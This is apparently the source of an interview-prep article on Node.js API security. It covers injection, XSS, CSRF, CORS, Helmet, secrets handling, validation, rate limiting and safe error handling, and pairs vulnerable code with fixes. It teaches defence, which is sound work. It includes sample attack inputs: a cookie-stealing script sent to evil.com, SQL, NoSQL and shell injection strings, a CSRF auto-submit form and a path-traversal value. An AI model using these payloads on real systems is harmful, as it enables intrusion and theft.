import MermaidDiagram from "@/components/diagrams/MermaidDiagram";
import { ArticleTable } from "@/components/ui";
import type { TocItem } from "@/lib/types/academy";

const sqlInjectionDiagram = String.raw`sequenceDiagram
    actor A as Attacker
    participant S as Express Server
    participant DB as Database

    Note over A: Normal request
    A->>S: GET /users?id=123
    S->>DB: SELECT * FROM users WHERE id = 123
    DB-->>S: { id: 123, name: "Alice" }

    Note over A: SQL Injection attack
    A->>S: GET /users?id=123 OR 1=1
    S->>DB: SELECT * FROM users WHERE id = 123 OR 1=1
    DB-->>S: ALL rows in users table! (data breach)

    Note over A: Destructive injection
    A->>S: GET /users?id=1; DROP TABLE users;--
    S->>DB: SELECT * FROM users WHERE id = 1; DROP TABLE users;--
    DB-->>S: Table deleted!`;

const csrfDiagram = String.raw`sequenceDiagram
    actor U as Victim (logged in)
    participant B as Victim's Browser
    participant E as Evil Site
    participant S as Your API

    U->>B: Visit evil.com while logged into yourapp.com
    E->>B: Serve page with hidden form / malicious JS

    Note over B,S: Browser auto-sends session cookie!
    B->>S: POST /api/transfer { to: "attacker", amount: 5000 }\nCookie: sessionId=abc (auto-sent)
    S->>S: Sees valid session → executes transfer!
    S-->>B: 200 — money transferred to attacker`;

const corsDiagram = String.raw`sequenceDiagram
    participant B as Browser (frontend.com)
    participant S as API Server (api.myapp.com)

    Note over B,S: Simple request (no preflight)
    B->>S: GET /api/data\nOrigin: https://frontend.com
    S-->>B: 200 data\nAccess-Control-Allow-Origin: https://frontend.com

    Note over B,S: Complex request (with preflight)
    B->>S: OPTIONS /api/users\nOrigin: https://frontend.com\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: Content-Type, Authorization
    S-->>B: 204\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: GET, POST, PATCH, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400
    B->>S: POST /api/users { ... }\nOrigin: https://frontend.com\nAuthorization: Bearer token
    S-->>B: 201 { data: user }`;

export const toc: TocItem[] = [
  { id: "common-risks", title: "Common security risks in Node.js APIs", level: 2 },
  { id: "sql-injection", title: "What is SQL injection?", level: 2 },
  { id: "nosql-injection", title: "What is NoSQL injection?", level: 2 },
  { id: "prevent-injection", title: "Preventing injection attacks", level: 2 },
  { id: "xss", title: "What is XSS?", level: 2 },
  { id: "csrf", title: "What is CSRF?", level: 2 },
  { id: "csrf-apis", title: "Is CSRF still relevant for APIs?", level: 2 },
  { id: "cors", title: "What is CORS?", level: 2 },
  { id: "how-cors-works", title: "How does CORS work?", level: 2 },
  { id: "cors-safely", title: "Configuring CORS safely", level: 2 },
  { id: "helmet", title: "What is Helmet in Express?", level: 2 },
  { id: "secrets-git", title: "Why secrets must not be committed to Git", level: 2 },
  { id: "secrets-production", title: "Managing secrets in production", level: 2 },
  { id: "input-validation", title: "What is input validation?", level: 2 },
  { id: "sanitization", title: "What is sanitization?", level: 2 },
  { id: "trust-client", title: "Why you must not trust client input", level: 2 },
  { id: "large-payloads", title: "Protecting against large payload attacks", level: 2 },
  { id: "rate-limiting", title: "What is rate limiting?", level: 2 },
  { id: "error-leaking", title: "Preventing sensitive data in error responses", level: 2 },
  { id: "logging-dos-donts", title: "What to log and what to avoid logging", level: 2 },
];

export default function InterviewSecurity() {
  return (
    <div className="article-content">
      <p>
        Section 7 of 18 — Security. This is one of the most important sections for senior
        engineers. Interviewers want to see you think about attack vectors proactively, not
        just reactively. Know the OWASP Top 10 by name and know the fix for each one.
      </p>

      {/* ─── Q1 ─── */}
      <h2 id="common-risks">What are common security risks in Node.js APIs?</h2>
      <ArticleTable caption="OWASP Top 10 — the canonical list of web application security risks" minWidth={880}>
        <table>
          <thead>
            <tr>
              <th>Risk</th>
              <th>What it means</th>
              <th>Fix in one line</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Injection (SQLi, NoSQLi)</strong></td>
              <td>Unsanitized user input executed as code by DB or OS</td>
              <td>Use parameterized queries / ORM; never interpolate user input into queries</td>
            </tr>
            <tr>
              <td><strong>Broken authentication</strong></td>
              <td>Weak tokens, plain text passwords, no brute-force protection</td>
              <td>bcrypt passwords, short-lived JWTs, rate-limit login, MFA</td>
            </tr>
            <tr>
              <td><strong>Sensitive data exposure</strong></td>
              <td>Passwords, keys, PII in logs, error responses, or unencrypted storage</td>
              <td>Hash passwords, redact logs, encrypt PII at rest, HTTPS everywhere</td>
            </tr>
            <tr>
              <td><strong>Broken access control</strong></td>
              <td>Missing auth checks — users access other users&apos; data</td>
              <td>Check ownership on every resource endpoint; deny by default</td>
            </tr>
            <tr>
              <td><strong>Security misconfiguration</strong></td>
              <td>Default credentials, verbose error messages, missing security headers</td>
              <td>Use Helmet, validate config at startup, disable debug mode in production</td>
            </tr>
            <tr>
              <td><strong>XSS</strong></td>
              <td>Injecting scripts into pages that run in other users&apos; browsers</td>
              <td>Escape output, Content-Security-Policy headers, never trust user HTML</td>
            </tr>
            <tr>
              <td><strong>CSRF</strong></td>
              <td>Tricking users into making authenticated requests from malicious sites</td>
              <td>SameSite cookies, CSRF tokens, check Origin header</td>
            </tr>
            <tr>
              <td><strong>Vulnerable dependencies</strong></td>
              <td>Outdated packages with known CVEs</td>
              <td><code>npm audit</code>, Snyk, Dependabot — automate dependency updates</td>
            </tr>
            <tr>
              <td><strong>Mass assignment</strong></td>
              <td>User sets fields they shouldn&apos;t (e.g. <code>isAdmin: true</code>)</td>
              <td>Whitelist allowed fields with Zod schemas — never spread <code>req.body</code> directly</td>
            </tr>
            <tr>
              <td><strong>Rate limiting / DoS</strong></td>
              <td>Flooding API with requests until it goes down</td>
              <td>express-rate-limit with Redis store, Cloudflare DDoS protection</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>

      {/* ─── Q2 ─── */}
      <h2 id="sql-injection">What is SQL injection?</h2>
      <MermaidDiagram
        chart={sqlInjectionDiagram}
        title="SQL Injection Attack"
        caption="The attacker sends SQL syntax as user input. If the server interpolates it directly into a query, the database executes the attacker's SQL — reading, modifying, or deleting data."
        minHeight={480}
      />
      <pre>
        <code>{`// ❌ Vulnerable — interpolating user input directly into SQL
const userId = req.query.id; // could be: "1 OR 1=1" or "1; DROP TABLE users;--"
const result = await db.query(\`SELECT * FROM users WHERE id = \${userId}\`);
//                                                               ^^^^^^^^ NEVER DO THIS

// ✅ Safe — parameterized query (user input is data, never code)
const result = await db.query("SELECT * FROM users WHERE id = $1", [req.query.id]);
// The DB driver separates the query template from the data — injection impossible

// With Prisma (ORM) — parameterized automatically
const user = await prisma.user.findUnique({ where: { id: req.query.id } }); // safe

// With raw Prisma query — still parameterized
const users = await prisma.$queryRaw\`SELECT * FROM users WHERE id = \${req.query.id}\`;
// The template literal tag ($queryRaw) parameterizes automatically

// ❌ Even with Prisma, this is dangerous:
const users = await prisma.$queryRawUnsafe(
  \`SELECT * FROM users WHERE name = '\${req.query.name}'\` // ← interpolated = injectable
);`}</code>
      </pre>

      {/* ─── Q3 ─── */}
      <h2 id="nosql-injection">What is NoSQL injection?</h2>
      <p>
        NoSQL injection targets databases like MongoDB. Instead of SQL syntax, attackers
        inject query operators (<code>$where</code>, <code>$gt</code>, <code>$regex</code>)
        as JSON to manipulate queries.
      </p>
      <pre>
        <code>{`// ❌ Vulnerable MongoDB query — req.body spread directly
app.post("/auth/login", async (req, res) => {
  const user = await User.findOne({ email: req.body.email, password: req.body.password });
  // Attacker sends: { "email": { "$gt": "" }, "password": { "$gt": "" } }
  // MongoDB interprets $gt as "greater than empty string" → matches ALL users!
  // Attacker bypasses auth entirely
});

// ✅ Fix 1: Validate and type inputs with Zod first
const LoginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).max(100),
});
const { email, password } = LoginSchema.parse(req.body);
// Zod coerces to strings — operator objects become "[object Object]" → query fails harmlessly

// ✅ Fix 2: Use mongoose with strict schema types
// Schema typed as String will cast { $gt: "" } to a string — operator lost

// ✅ Fix 3: mongo-sanitize — strip $ from all keys
import sanitize from "mongo-sanitize";
const safe = sanitize(req.body); // removes all keys starting with $`}</code>
      </pre>

      {/* ─── Q4 ─── */}
      <h2 id="prevent-injection">How do you prevent injection attacks?</h2>
      <pre>
        <code>{`// Rule 1: NEVER interpolate user input into queries, commands, or code
// Always use parameterized queries, ORMs, or prepared statements

// Rule 2: Validate all inputs at the boundary with strict schemas
import { z } from "zod";

const SearchSchema = z.object({
  q: z.string().max(200).regex(/^[a-zA-Z0-9 .,'-]+$/, "No special characters"),
  category: z.enum(["tech", "science", "sports"]), // whitelist — not free text
  limit: z.coerce.number().int().min(1).max(100),
});
// Whitelist expected values — reject anything unexpected

// Rule 3: Principle of least privilege for DB users
// Your API's DB user should only have SELECT/INSERT/UPDATE/DELETE on specific tables
// Never connect to the DB as root/superuser from application code

// Rule 4: Use ORM or query builder that parameterizes automatically
// Prisma, TypeORM, Knex — all parameterize by default

// Rule 5: OS command injection — never pass user input to exec/spawn
import { exec } from "child_process";
// ❌ Dangerous:
exec(\`convert \${req.query.filename} output.jpg\`); // filename = "file.jpg; rm -rf /"

// ✅ Safe: use execFile with arguments array (no shell interpolation)
import { execFile } from "child_process";
execFile("convert", [req.query.filename, "output.jpg"]); // args never interpreted as shell`}</code>
      </pre>

      {/* ─── Q5 ─── */}
      <h2 id="xss">What is XSS?</h2>
      <p>
        Cross-Site Scripting (XSS) is an attack where an attacker injects malicious JavaScript
        into a page that other users view. The script runs in the victim&apos;s browser with
        full access to the page — stealing cookies, tokens, keystrokes, or performing actions
        on their behalf.
      </p>
      <pre>
        <code>{`// Stored XSS — attacker saves malicious content to your DB
// Example: comment field allows HTML

// Attacker posts this comment:
// <script>fetch('https://evil.com?c=' + document.cookie)</script>

// When any user views the page with this comment:
// Their browser executes the script — cookie sent to attacker

// ❌ Vulnerable — rendering user content without escaping
res.send(\`<div>\${userComment}</div>\`); // if userComment contains <script> → XSS

// ✅ Node.js API defence:
// 1. Set Content-Security-Policy header (Helmet does this)
// 2. Never render user content as raw HTML in server-rendered pages
// 3. Escape output: use a template engine that escapes by default (Handlebars, Pug)
// 4. Sanitize stored HTML with DOMPurify (client) or sanitize-html (server)

import sanitizeHtml from "sanitize-html";
const clean = sanitizeHtml(userInput, {
  allowedTags: ["b", "i", "em", "strong", "p"], // whitelist only safe tags
  allowedAttributes: {},                          // no attributes (no onclick, href, etc.)
});
// <script>...</script> → stripped
// <b>Hello</b> → kept

// 5. For pure REST APIs (JSON responses only): XSS is not a concern for your API
// But if you accept user content that gets rendered by a frontend — sanitize before storing`}</code>
      </pre>

      {/* ─── Q6 ─── */}
      <h2 id="csrf">What is CSRF?</h2>
      <MermaidDiagram
        chart={csrfDiagram}
        title="CSRF Attack — Browser Auto-Sends Cookies"
        caption="The victim is already logged in. The evil site makes the browser send a state-changing request to your API — the browser automatically includes the session cookie, so your server can't tell it's not the user."
        minHeight={400}
      />
      <pre>
        <code>{`// CSRF exploits the fact that browsers automatically send cookies
// with every request to the matching domain — even from other sites

// Attack scenario:
// 1. User logs into bank.com — session cookie set
// 2. User visits evil.com (same browser session)
// 3. evil.com has: <form action="https://bank.com/transfer" method="POST">
//                    <input name="amount" value="5000">
//                    <input name="to" value="attacker-account">
//                  </form>
//                  <script>document.forms[0].submit()</script>
// 4. Browser submits the form to bank.com — session cookie sent automatically
// 5. Bank sees a valid session — executes the transfer!

// CSRF defences:
// 1. SameSite=Strict cookies (modern browsers — best defence)
res.cookie("sessionId", token, { sameSite: "strict" });
// Browser won't send this cookie on cross-site requests

// 2. CSRF token — server generates random token per session, client includes in form/header
// Attacker's site can't read the token (same-origin policy) so can't include it

// 3. Check Origin/Referer header
if (req.headers.origin && req.headers.origin !== "https://yourapp.com") {
  res.status(403).json({ error: "CSRF detected" });
  return;
}`}</code>
      </pre>

      {/* ─── Q7 ─── */}
      <h2 id="csrf-apis">Is CSRF still relevant for APIs?</h2>
      <p>
        <strong>It depends on your auth mechanism.</strong>
      </p>
      <ArticleTable caption="CSRF relevance depends entirely on how you authenticate requests" minWidth={800}>
        <table>
          <thead>
            <tr>
              <th>Auth method</th>
              <th>CSRF risk?</th>
              <th>Why</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Session cookie (no SameSite)</td>
              <td>🔴 High</td>
              <td>Browser auto-sends cookie on cross-site requests</td>
            </tr>
            <tr>
              <td>Session cookie + <code>SameSite=Strict</code></td>
              <td>🟢 None</td>
              <td>Browser refuses to send cookie on cross-site requests</td>
            </tr>
            <tr>
              <td>JWT in <code>Authorization: Bearer</code> header</td>
              <td>🟢 None</td>
              <td>Headers are not automatically sent by browsers — must be set explicitly by JS</td>
            </tr>
            <tr>
              <td>JWT in HttpOnly cookie</td>
              <td>🟡 Possible</td>
              <td>Cookie auto-sent — use <code>SameSite=Strict</code> to prevent</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>
      <p>
        <strong>Interview answer:</strong> &quot;For pure JSON APIs that use{" "}
        <code>Authorization: Bearer</code> headers, CSRF is not a concern — browsers won&apos;t
        automatically add custom headers on cross-site requests. If you use cookies for auth,
        always set <code>SameSite=Strict</code>.&quot;
      </p>

      {/* ─── Q8 ─── */}
      <h2 id="cors">What is CORS?</h2>
      <p>
        CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls
        which origins (domain + protocol + port) are allowed to make requests to your API from
        JavaScript. It is enforced by the <strong>browser</strong> — not by your server — to
        prevent malicious websites from making API calls using the visitor&apos;s credentials.
      </p>
      <p>
        Same origin: <code>https://app.com</code> calling <code>https://app.com/api</code> → no CORS.{" "}
        Cross origin: <code>https://frontend.com</code> calling <code>https://api.myapp.com</code> → CORS kicks in.
      </p>

      {/* ─── Q9 ─── */}
      <h2 id="how-cors-works">How does CORS work?</h2>
      <MermaidDiagram
        chart={corsDiagram}
        title="CORS Preflight Flow"
        caption="Simple requests (GET, POST with basic Content-Type) go directly. Complex requests (custom headers, non-simple methods) require a preflight OPTIONS request first. The browser enforces the rules — not Node.js."
        minHeight={500}
      />
      <pre>
        <code>{`// CORS is browser-enforced. curl and Postman are unaffected — they don't have CORS.
// The browser checks response headers and blocks JS access if origin not allowed.

// Simple request: GET with no custom headers
// → browser sends Origin header, checks Allow-Origin in response

// Preflight (OPTIONS) triggered by:
// - Non-simple methods: PUT, PATCH, DELETE
// - Custom headers: Authorization, Content-Type: application/json
// - Browser asks: "Is this origin allowed to make this request?"
// → Server must respond to OPTIONS with the CORS headers before the real request is made

// The key headers:
// Request: Origin: https://frontend.com
// Response must include: Access-Control-Allow-Origin: https://frontend.com (or *)
// If missing or wrong → browser blocks the response (even though server processed it!)`}</code>
      </pre>

      {/* ─── Q10 ─── */}
      <h2 id="cors-safely">How do you configure CORS safely?</h2>
      <pre>
        <code>{`import cors from "cors";

// ❌ Unsafe: wildcard allows ANY origin — credentials won't work either
app.use(cors()); // Access-Control-Allow-Origin: *

// ✅ Safe: explicit allowlist of trusted origins
const allowedOrigins = process.env.ALLOWED_ORIGINS!.split(","); // "https://app.com,https://admin.app.com"

app.use(cors({
  origin: (requestOrigin, callback) => {
    // Allow requests with no Origin (curl, Postman, server-to-server)
    if (!requestOrigin) return callback(null, true);

    if (allowedOrigins.includes(requestOrigin)) {
      callback(null, requestOrigin); // echo back the specific origin (not *)
    } else {
      callback(new Error(\`CORS: origin \${requestOrigin} not allowed\`));
    }
  },
  credentials: true,           // allow cookies to be sent cross-origin
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "X-Request-ID"],
  maxAge: 86400,               // cache preflight response for 24h
}));

// credentials: true requires non-wildcard origin — * + credentials = CORS error
// allowedHeaders whitelist — never use allowedHeaders: "*" (exposes all headers)

// Common CORS mistake: applying it AFTER routes
// app.use("/api", apiRouter); // ← routes registered first
// app.use(cors());            // ← CORS applied after — preflight OPTIONS never reaches it
// Fix: cors() must be registered BEFORE all routes`}</code>
      </pre>

      {/* ─── Q11 ─── */}
      <h2 id="helmet">What is Helmet in Express?</h2>
      <p>
        Helmet is a middleware that sets security-relevant HTTP response headers. Each header
        defends against a specific class of attack. One line — significant security improvement.
      </p>
      <ArticleTable caption="Helmet's headers — what each one does" minWidth={880}>
        <table>
          <thead>
            <tr>
              <th>Header</th>
              <th>Defends against</th>
              <th>Example value</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>Content-Security-Policy</code></td>
              <td>XSS — restricts which scripts, styles, and resources can load</td>
              <td><code>default-src 'self'</code></td>
            </tr>
            <tr>
              <td><code>X-Frame-Options</code></td>
              <td>Clickjacking — prevents your page being embedded in an iframe</td>
              <td><code>DENY</code> or <code>SAMEORIGIN</code></td>
            </tr>
            <tr>
              <td><code>Strict-Transport-Security</code></td>
              <td>Protocol downgrade attacks — forces HTTPS for 1 year</td>
              <td><code>max-age=31536000; includeSubDomains</code></td>
            </tr>
            <tr>
              <td><code>X-Content-Type-Options</code></td>
              <td>MIME sniffing — browser must respect declared Content-Type</td>
              <td><code>nosniff</code></td>
            </tr>
            <tr>
              <td><code>Referrer-Policy</code></td>
              <td>Leaking URLs — controls what is sent in Referer header</td>
              <td><code>strict-origin-when-cross-origin</code></td>
            </tr>
            <tr>
              <td><code>Permissions-Policy</code></td>
              <td>Feature abuse — disables browser features (camera, geolocation) unless needed</td>
              <td><code>geolocation=()</code></td>
            </tr>
            <tr>
              <td><code>X-Powered-By</code> (removed)</td>
              <td>Fingerprinting — attackers can&apos;t target known Express vulnerabilities</td>
              <td>Header removed</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>
      <pre>
        <code>{`import helmet from "helmet";

// Default helmet — sensible defaults for all headers above
app.use(helmet());

// Customized for an API that serves only JSON (no HTML)
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],   // no inline scripts
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  crossOriginEmbedderPolicy: false, // may conflict with some embedded content
}));

// Must be registered EARLY — before routes
// So every response, including errors, gets security headers
app.use(helmet());
app.use(cors(allowedOrigins));
app.use(express.json());
// ... routes below`}</code>
      </pre>

      {/* ─── Q12 ─── */}
      <h2 id="secrets-git">Why should secrets not be committed to Git?</h2>
      <p>
        Once a secret is committed to Git, it is effectively public — even if you delete it
        later. Git history is permanent. GitHub scans public repos for secrets automatically.
        Services like GitGuardian and TruffleHog scan all commits including deleted ones.
        Compromised credentials in Git history have caused some of the largest data breaches.
      </p>
      <pre>
        <code>{`# These must NEVER be in any file committed to git:
DATABASE_URL=postgresql://user:realpassword@prod-db.com/mydb
JWT_SECRET=super-secret-signing-key
STRIPE_SECRET_KEY=sk_live_...
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=...

# .gitignore — add before first commit
.env
.env.local
.env.production
*.pem
*.key
config/secrets.json

# If a secret was accidentally committed:
# 1. Rotate/revoke it IMMEDIATELY — assume it is compromised
# 2. Remove from history with git-filter-repo (not git rm — history remains)
# git-filter-repo --path .env --invert-paths
# 3. Force push (all contributors must re-clone)

# Prevention:
# - Use .env.example with dummy values (committed)
# - pre-commit hook that checks for secrets: use git-secrets or gitleaks
# - GitHub secret scanning: enabled by default on public repos`}</code>
      </pre>

      {/* ─── Q13 ─── */}
      <h2 id="secrets-production">How do you manage secrets in production?</h2>
      <pre>
        <code>{`// Option 1: Platform environment variables (simplest)
// Railway, Render, Fly.io, Heroku — set env vars in their dashboards
// Injected into process.env at runtime — no file needed
// ✅ Simple ✅ Never in code ❌ No audit trail ❌ Hard to rotate at scale

// Option 2: AWS Secrets Manager / Parameter Store
import { SecretsManagerClient, GetSecretValueCommand } from "@aws-sdk/client-secrets-manager";

const client = new SecretsManagerClient({ region: "us-east-1" });
const { SecretString } = await client.send(
  new GetSecretValueCommand({ SecretId: "prod/myapp/database" })
);
const { DATABASE_URL, JWT_SECRET } = JSON.parse(SecretString!);
// ✅ Audit trail ✅ Fine-grained IAM access ✅ Automatic rotation ✅ Versioned

// Option 3: Kubernetes Secrets (if running on K8s)
// Store secrets as K8s Secret objects — injected as env vars or mounted as files
// ✅ Native K8s ✅ RBAC controlled ❌ Secrets stored base64 encoded (not encrypted by default)
// ✅ Use Sealed Secrets or External Secrets Operator for encryption at rest

// Option 4: HashiCorp Vault
// Enterprise-grade secrets management — dynamic secrets, lease management, audit
// ✅ Most powerful ❌ Most complex to operate

// In all cases:
// - Load secrets at startup, validate with Zod, export as config object
// - No process.env scattered across the codebase
// - Rotate secrets regularly — especially after engineer offboarding`}</code>
      </pre>

      {/* ─── Q14 ─── */}
      <h2 id="input-validation">What is input validation?</h2>
      <p>
        Input validation is checking that data sent by a client conforms to the expected shape,
        type, format, and constraints <strong>before</strong> it touches your business logic or
        database. It is the first line of defence against injection, type confusion, and data
        corruption.
      </p>
      <pre>
        <code>{`// Validate at the HTTP boundary — the only place you control what enters the system
import { z } from "zod";

const CreateUserSchema = z.object({
  name: z.string()
    .min(1, "Name required")
    .max(100, "Name too long")
    .regex(/^[a-zA-Z\s'-]+$/, "Name contains invalid characters"),
  email: z.string().email("Invalid email format"),
  age: z.number().int().min(18, "Must be 18+").max(120),
  role: z.enum(["user", "editor"]), // whitelist — not free-form string
  website: z.string().url().optional(),
});

// Validate before any business logic
app.post("/users", asyncHandler(async (req, res) => {
  const data = CreateUserSchema.parse(req.body); // throws if invalid → 400 via error middleware
  // At this point, data is FULLY TYPED AND VALIDATED — safe to pass to service
  const user = await userService.create(data);
  res.status(201).json({ data: user });
}));

// Key validation principles:
// 1. Whitelist (specify what's allowed) > blacklist (block what's known bad)
// 2. Validate every field: type, format, length, range
// 3. Validate at EVERY entry point: REST body, query params, path params, headers
// 4. TypeScript types ≠ runtime validation — they vanish at compile time
//    req.body.age is "string" at runtime (JSON), not number — Zod.coerce.number() fixes this`}</code>
      </pre>

      {/* ─── Q15 ─── */}
      <h2 id="sanitization">What is sanitization?</h2>
      <p>
        Sanitization transforms or strips potentially dangerous content from input after it is
        validated. Validation rejects bad input — sanitization makes risky input safe to use.
        Both are needed for different scenarios.
      </p>
      <pre>
        <code>{`// Sanitization examples:

// 1. HTML sanitization — strip XSS payloads from user HTML content
import sanitizeHtml from "sanitize-html";
const safeContent = sanitizeHtml(req.body.content, {
  allowedTags: ["p", "b", "i", "em", "strong", "ul", "li"],
  allowedAttributes: {}, // no onclick, href, style
});

// 2. SQL wildcard sanitization — escape % and _ for LIKE queries
function escapeLike(str: string) {
  return str.replace(/[%_\\]/g, "\\$&");
}
const safeQ = escapeLike(req.query.q as string);
// Use parameterized query — concat the % outside the template
const pattern = "%" + safeQ + "%";
await db.$queryRaw(["SELECT * FROM users WHERE name LIKE ", ""] as any, pattern);

// 3. Filename sanitization — prevent path traversal
const { basename, join } = await import("node:path");
const filename = basename(req.query.file as string); // strips ../../etc/passwd
const safePath = join("/uploads", filename);
// basename("../../etc/passwd") → "passwd" — traversal neutralized

// 4. Trim and normalize strings
const email = req.body.email.toLowerCase().trim(); // normalize before storing

// Validation vs Sanitization:
// Validation: "Is this input acceptable?" → reject if not
// Sanitization: "Can I make this input safe?" → transform it
// For structured data (numbers, IDs, enums): validate and reject bad input
// For free text (comments, bio, HTML): validate length/format + sanitize content`}</code>
      </pre>

      {/* ─── Q16 ─── */}
      <h2 id="trust-client">Why should you not trust client input?</h2>
      <p>
        Anyone can send any HTTP request to your API — not just your frontend. curl, Postman,
        custom scripts, and attackers can all craft arbitrary request bodies, headers, and query
        strings. TypeScript types on the frontend give you zero protection on the backend.
      </p>
      <pre>
        <code>{`// Your frontend sends: { "name": "Alice", "email": "alice@example.com" }
// An attacker can send: { "name": "Alice", "email": "alice@example.com", "role": "admin", "isAdmin": true }

// ❌ Never spread req.body directly into a DB update
await db.user.update({
  where: { id: req.params.id },
  data: req.body, // ← mass assignment! attacker promotes themselves to admin
});

// ✅ Only accept what you explicitly whitelist
const UpdateSchema = z.object({
  name: z.string().max(100).optional(),
  bio: z.string().max(500).optional(),
  // role, isAdmin, passwordHash — NOT listed = cannot be set via this endpoint
});
const updates = UpdateSchema.parse(req.body); // strips everything not in schema
await db.user.update({ where: { id: req.params.id }, data: updates });

// Other examples of not trusting the client:
// - Client sends { "price": 0.01 } for a $99 product → always fetch price from DB
// - Client sends { "userId": "other-user-id" } → always use req.user.id from JWT
// - Client sends { "isVerified": true } → field should be set server-side only`}</code>
      </pre>

      {/* ─── Q17 ─── */}
      <h2 id="large-payloads">How do you protect against large payload attacks?</h2>
      <pre>
        <code>{`// Without limits: attacker sends a 10GB JSON body
// → Express buffers entire body in memory → heap exhausted → process crashes → DoS

// Layer 1: Body size limit in express.json()
app.use(express.json({ limit: "100kb" })); // reject bodies > 100KB before parsing
// Express sends 413 Payload Too Large automatically

// Layer 2: Different limits for different endpoints
app.use("/api", express.json({ limit: "50kb" }));  // API endpoints — small JSON
app.use("/upload", express.raw({ limit: "10mb" })); // file uploads — larger limit

// Layer 3: Stream large uploads instead of buffering
import multer from "multer";
const upload = multer({
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB per file
  fileFilter: (_req, file, cb) => {
    const allowed = ["image/jpeg", "image/png", "image/webp"];
    cb(null, allowed.includes(file.mimetype));
  },
});
app.post("/avatar", upload.single("file"), handler);

// Layer 4: Nginx upstream limits (additional protection before Node)
// client_max_body_size 10m; ← nginx config — rejects before hitting Node at all

// Layer 5: Rate limiting — even small requests can overwhelm if sent en masse
// Limits on concurrent connections and requests per IP

// Layer 6: ReDoS (Regular Expression DoS)
// Catastrophic backtracking in regex with complex patterns + long input → CPU spike
// Example evil input for regex /^(a+)+$/ : "aaaaaaaaaaaaaaaaaaaaab"
// Use safe-regex npm package or keep regexes simple
import safeRegex from "safe-regex";
const userPattern = /^[a-z0-9]+$/;
if (!safeRegex(userPattern)) throw new Error("Unsafe regex detected");`}</code>
      </pre>

      {/* ─── Q18 ─── */}
      <h2 id="rate-limiting">What is rate limiting?</h2>
      <p>
        Rate limiting caps the number of requests a client can make in a time window — protecting
        the API from abuse, brute force, and accidental overload. Covered in depth in Section 5.
        Key points to add from a security angle:
      </p>
      <pre>
        <code>{`// Security-focused rate limiting strategy:

// Global: protect all endpoints from floods
app.use(rateLimit({ windowMs: 60_000, max: 200, store: redisStore }));

// Auth endpoints: strict — prevent credential stuffing and brute force
app.use("/auth/login", rateLimit({ windowMs: 15 * 60_000, max: 10, store: redisStore }));
app.use("/auth/forgot-password", rateLimit({ windowMs: 60 * 60_000, max: 3, store: redisStore }));

// Key by user ID (not just IP) — prevents attackers rotating IPs
const userLimiter = rateLimit({
  keyGenerator: (req) => req.user?.id ?? req.ip,
  max: 60,
  windowMs: 60_000,
  store: redisStore,
});

// Return proper headers so clients can self-throttle
// X-RateLimit-Limit: 200
// X-RateLimit-Remaining: 42
// Retry-After: 30 (on 429)

// Algorithm options:
// Fixed window: simple, cheap. Allows burst at window boundary (100 reqs in last ms + first ms)
// Sliding window: more accurate, slightly more expensive (uses sorted sets in Redis)
// Token bucket: smooth rate, allows short bursts up to bucket size`}</code>
      </pre>

      {/* ─── Q19 ─── */}
      <h2 id="error-leaking">How do you prevent sensitive data from leaking in error responses?</h2>
      <pre>
        <code>{`// ❌ Leaking internals — tells attackers exactly what to target
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,  // "connect ECONNREFUSED 10.0.1.5:5432" → DB internal IP exposed
    stack: err.stack,    // full stack trace → file paths, line numbers, code structure
    query: err.query,    // "SELECT * FROM users WHERE..." → schema exposed
  });
});

// ✅ Safe error handling — different behaviour per environment
app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
  const isProduction = process.env.NODE_ENV === "production";

  // ALWAYS log full error internally
  logger.error({
    err,                        // full stack trace, message, metadata
    requestId: req.requestId,   // for correlating with user reports
    method: req.method,
    url: req.url,
    userId: req.user?.id,
  }, "Request error");

  // Operational errors: safe to show
  if (err instanceof AppError) {
    res.status(err.statusCode).json({
      error: { message: err.message, code: err.code },
    });
    return;
  }

  // Unknown errors: show nothing in production
  res.status(500).json({
    error: {
      message: isProduction ? "Internal server error" : err.message,
      code: "INTERNAL_ERROR",
      ...(isProduction ? {} : { stack: err.stack }), // stack only in dev
    },
  });
});

// Other leaking vectors to prevent:
// - DB column names in Prisma error messages → catch and wrap Prisma errors
// - Internal IP addresses in logs (ok) but not in responses
// - User emails in error responses for "email not found" → generic "invalid credentials"
// - Version numbers in headers → remove X-Powered-By (Helmet does this)`}</code>
      </pre>

      {/* ─── Q20 ─── */}
      <h2 id="logging-dos-donts">What should you log and what should you avoid logging?</h2>
      <ArticleTable caption="Logging the wrong things is a compliance violation — GDPR, PCI-DSS, HIPAA all restrict what you can store" minWidth={840}>
        <table>
          <thead>
            <tr>
              <th>Category</th>
              <th>✅ DO log</th>
              <th>❌ NEVER log</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Requests</strong></td>
              <td>Method, path, status code, duration, request ID, user ID</td>
              <td>Request body containing passwords, tokens, or PII</td>
            </tr>
            <tr>
              <td><strong>Auth</strong></td>
              <td>Login success/failure events, user ID, IP, timestamp</td>
              <td>Passwords, plain-text tokens, JWT payloads</td>
            </tr>
            <tr>
              <td><strong>Errors</strong></td>
              <td>Error type, message, stack trace, request ID, user ID</td>
              <td>Raw SQL with user data, DB connection strings</td>
            </tr>
            <tr>
              <td><strong>User data</strong></td>
              <td>User ID (opaque identifier), account action type</td>
              <td>Email, phone, SSN, credit card numbers, health data</td>
            </tr>
            <tr>
              <td><strong>Headers</strong></td>
              <td>User-Agent, X-Request-ID, X-Forwarded-For</td>
              <td>Authorization header (contains JWT/API key)</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>
